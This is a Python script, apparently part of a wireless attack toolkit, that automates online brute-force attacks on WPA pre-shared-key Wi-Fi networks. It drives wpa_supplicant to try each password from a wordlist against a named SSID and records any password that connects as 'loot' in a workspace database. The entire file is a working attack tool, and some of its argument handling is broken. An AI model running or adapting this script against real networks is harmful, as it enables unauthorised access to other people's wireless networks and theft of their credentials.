#!/usr/bin/env python

#Author: Tylous

#Auto_PSK.py is a script designed to perform automated brute-force authentication attacks against Preshared Key networks. 
#Using the python library wpaspy, created by Jouni Malinen <j@w1.fi> to interact with the wpa_supplicant damon, 



import argparse
import time
import wpaspy
import os
import sys
sys.path.insert(0, '../../lib/')
from Queries import *
import pandas as dp
import sqlite3

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', metavar='Interface', dest='interface', action='store', help='The Interface to use\n', required=True)
parser.add_argument('-s', '--ssid', metavar='SSID', dest='ssid', action='store', help='The SSID to attack', required=True)
parser.add_argument('-W', '--workspace', metavar='workspace', dest='workspace', action='store', help='Workspace name\n', required=False)
parser.add_argument('-P', '--passwordfile', metavar='Passwordfile', dest='Passwordfile', action='store', help='Password to use\n', required=False)
parser.add_argument('-p', '--password', metavar='Password', dest='password', action='store', help='Password to use\n', required=False)
args = parser.parse_args()



wpas_ctrl = '/var/run/wpa_supplicant'

#Sets the wpa_supplicant conf, CLI interpreter and the interface to be used####
def wpas_connect():
	os.system('wpa_supplicant -i' + args.interface +' -c lib/wpa_supplicant.conf -K -B > /dev/null')
	ifaces = []
	if os.path.isdir(wpas_ctrl):
		try:
			ifaces = [os.path.join(wpas_ctrl, i) for i in os.listdir(wpas_ctrl)]
		except OSError, error:
			print "Could not find wpa_supplicant: ", error
			return None

	if len(ifaces) < 1:
		print "No wpa_supplicant control interface found"
		return None

	for ctrl in ifaces:
		try:
			wpas = wpaspy.Ctrl(ctrl)
			return wpas
		except Exception, e:
			pass
		return None


#Configures the supplicant and performs the automated attack#
def main():
	try:
		failed = ('\033[91m' + 'FAILED' + '\033[0m')
		success = ('\033[92m' + 'SUCCESS' + '\033[0m')
		#password = (args.password)
		print "Initialized..."
		wpa = wpas_connect()
		if wpa is None:
			return
		wpa.attach()
		wpa.request('ADD_NETWORK')
		wpa.request('SET_NETWORK 0 ssid "' + args.ssid + '"')

		if bool(args.Passwordfile):
			try:
				f = open(args.Passwordfile)
				passwords = f.readlines()
			except IOError: 
				print "Can't read "+args.Passwordfile
				sys.exit(1)
		else:
			password = args.Password


		#LOoper#
		for password in passwords:
			wpa.request('SET_NETWORK 0 psk "' + password.rstrip(os.linesep) + '"')
			sys.stdout.write ('Trying password: ' + password.rstrip(os.linesep)+' ')
			wpa.request('ENABLE_NETWORK 0')
			wpa.request('LOGON')
			time.sleep(4)
			count= 0
			while count < 10:
				count +=1
				time.sleep(1)
				while wpa.pending():
					resp = wpa.recv()
					if 'CTRL-EVENT-CONNECTED' in  resp:
						print success
						loot = {'MAC': '','Password': '','Username': ''}
						loot.update(MAC = "N/A") 
						loot.update(Password = password)
						loot.update(Username = args.ssid)
						d = queries()
						d.db_connect('../../'+args.workspace)
						d.loot(loot)
						return
					if 'CTRL-EVENT-SSID-TEMP-DISABLED' in resp:
						print failed 
						count=11
						break
				if count == 10:
					print failed
			wpa.request('LOGOFF')				
			wpa.request('DISABLE_NETWORK 0')
			time.sleep(2)
		wpa.request('REMOVE_NETWORK 0')
		print 'Completed'
		wpa.detach()
		wpa.request('TERMINATE')
	except KeyboardInterrupt:
			wpa.request('TERMINATE')
			time.sleep(2)
			print '\n'
			print 'Shutting Down'
if __name__ == "__main__":
	main()
	sys.exit(0)
